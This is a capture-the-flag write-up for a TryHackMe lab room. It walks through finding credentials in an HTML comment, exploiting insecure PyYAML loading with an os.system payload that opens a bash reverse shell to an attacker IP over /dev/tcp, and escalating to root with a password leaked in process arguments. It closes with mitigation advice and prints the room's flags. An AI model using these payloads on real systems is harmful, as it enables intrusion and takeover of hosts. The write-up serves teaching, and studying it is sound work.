---
layout: default
title: Day 5 - Beach Bar
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 4 - Packet Light](../4_Packed_Light)

# Day 5 - Beach Bar      <a href="https://tryhackme.com/room/hh-beachbar-d849f7f7" target="_blank" rel="noopener"><img src="{{ '/assets/thm-logo.png' | relative_url }}" alt="TryHackMe" width="50"></a>

**Difficulty:** Easy  
**Category:** Web exploitation / YAML deserialization / Privilege escalation

**Summary:** This room focuses on exploiting a vulnerable web application feature that parses YAML files insecurely. After finding leaked credentials in the HTML source code, we upload a malicious YAML payload to get a reverse shell. Finally, we escalate our privileges to root by enumerating running processes and finding a plaintext password passed as a command-line argument.

## 1. Reconnaissance and web enumeration

We started our standard enumeration process by creating our working directories and running an `nmap` scan against the target to identify open ports and services:

```
mkdir day5
cd day5
mkdir nmap
nmap -sC -sV -oN nmap/initial 10.112.152.250
```

While inspecting the web application hosted on the target, we decided to look at the underlying HTML source code (using the browser's "inspect" or "view page source" feature). 

Developers sometimes leave sensitive information in HTML comments that are not visible on the rendered page. In this case, we found a "staff note" comment containing hardcoded credentials: `dj / dj`.

## 2. Exploitation (YAML deserialization)

Using the discovered credentials, we logged into the web application and found a feature allowing users to import a playlist via a terminal-like interface. 

This feature processes user input as YAML. Because the backend application uses an insecure YAML loading function in Python, we can perform a YAML Deserialization attack. This allows us to force the Python script to execute system commands.

We set up a Netcat listener on our local machine to catch the connection:

```
nc -lnvp 4444
```

Then, we submitted the following malicious YAML payload into the web application to trigger a reverse shell:

```
!!python/object/apply:os.system
["bash -c 'bash -i >& /dev/tcp/10.114.102.224/4444 0>&1'"]
```

Shortly after, our Netcat listener caught the connection. We checked our current directory (`/opt/beach-bar/webapp`) and read the first flag.

**Flag:** 
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{y4ml_pl4yl1st_pwns_th3_b34ch}</span>

## 3. Privilege escalation (process enumeration)

Before digging deeper, we stabilized our raw shell to make it fully interactive and prevent it from accidentally closing:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
We then backgrounded the shell (`Ctrl+Z`), ran `stty raw -echo` on our local machine, and brought it back to the foreground with `fg`.

Now looking for a way to escalate to root, we checked all running processes on the system using `ps aux`. To filter the long list, we specifically looked for processes related to the jukebox application we just exploited:

```
ps aux | grep jukebox
```

In the output, we spotted a service running with a highly sensitive command-line argument:
`... --stream-pass SunsetSpritz2024! ...`

Passing passwords as arguments is dangerous because any user on the system can see them using `ps aux`. Assuming this password might have been reused for the root administrator account, we attempted to switch users:

```
su root
# Entered password: SunsetSpritz2024!
```

The authentication was successful! We navigated to the `/root` directory and captured the final flag.

**Flag:** 
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}</span>

## 4. Mitigation (how to fix it)

To secure this system and prevent this attack chain, the following steps must be taken:

+ **Remove sensitive comments:** Never leave default credentials, developer notes, or sensitive paths in HTML comments. Source code should be cleaned before deployment.
+ **Use safe YAML loading:** The application is vulnerable because it uses a dangerous deserialization method (like `yaml.load()` in Python). Developers must switch to `yaml.safe_load()`, which parses data without executing arbitrary objects or system commands.
+ **Secure credential handling:** Never pass passwords or secrets as command-line arguments, as they become visible to all users via process monitoring tools. Use secure environment variables or properly restricted configuration files instead.
+ **Avoid credential reuse:** Service passwords (like the stream-pass) should never be the same as the root administrative password.

<br>
- [Day 6 - Overhear At Breakfast](../6_Overhear_At_Breakfast)